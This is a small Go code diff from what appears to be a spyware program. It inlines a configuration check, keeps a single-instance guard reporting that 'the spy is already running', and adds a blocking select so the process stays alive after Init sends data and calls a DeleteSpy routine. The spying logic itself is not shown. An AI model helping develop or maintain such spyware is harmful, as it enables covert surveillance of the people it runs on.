@@ -14,12 +14,13 @@ import (
 func main(){
 	
 	fmt.Println("INICIANDO")
-	axs:= config.ConfigTrmx()
+	
 
 	if(config.IsRunSpyware()){
 		fmt.Println("EL SPY YA ESTA CORRIENDO")
 	}else{
-		if (axs){
+		if (config.ConfigTrmx()){
+			
 		
 			Init()
 			
@@ -40,6 +41,7 @@ func Init(){
 	utils.Send("As")
 	//fmt.Println("siuuuuu")
 	config.DeleteSpy()
+	select{}
 	
 
 	
